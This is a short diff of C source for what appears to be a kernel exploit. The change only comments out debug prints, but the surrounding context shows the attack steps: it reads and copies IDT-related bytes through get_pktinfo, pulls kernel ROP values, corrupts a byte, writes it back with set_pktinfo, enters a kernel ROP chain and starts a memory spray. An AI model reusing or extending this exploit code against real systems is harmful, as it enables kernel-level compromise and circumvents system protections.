@@ -300,10 +300,9 @@ int main() {
 
     char buf[20];
     printf_("get_pktinfo() = %d\n", get_pktinfo(master_sock, buf));
-    printf_("idt before corruption: ");
-    for (int i = 0; i < 20; i++)
-        printf_("%02x ", (unsigned)(unsigned char)buf[i]);
-    printf_("\n");
+    //printf_("idt before corruption: ");
+    //for (int i = 0; i < 20; i++) printf_("%02x ", (unsigned)(unsigned char)buf[i]);
+    //printf_("\n");
     char buf2[20];
     for (int i = 0; i < 20; i++)
         buf2[i] = buf[i];
@@ -316,10 +315,9 @@ int main() {
     krop_ud1 = *(uint64_t*)(buf2 + 4);
     krop_ud2 = *(uint64_t*)(buf2 + 12);
     buf2[9] = 0xee;
-    printf_("idt after corruption:  ");
-    for (int i = 0; i < 20; i++)
-        printf_("%02x ", (unsigned)(unsigned char)buf2[i]);
-    printf_("\n");
+    //printf_("idt after corruption:  ");
+    //for (int i = 0; i < 20; i++)printf_("%02x ", (unsigned)(unsigned char)buf2[i]);
+    //printf_("\n");
     printf_("set_pktinfo() = %d\n", set_pktinfo(master_sock, buf2));
     enter_krop();
     char* spray_start = spray_bin;
